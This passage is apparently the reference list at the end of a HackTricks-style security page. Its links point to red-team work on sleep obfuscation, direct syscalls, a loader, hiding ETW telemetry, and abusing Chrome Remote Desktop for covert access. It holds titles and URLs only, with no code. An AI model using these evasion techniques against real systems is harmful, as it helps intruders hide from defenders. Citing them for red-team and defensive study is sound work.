- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
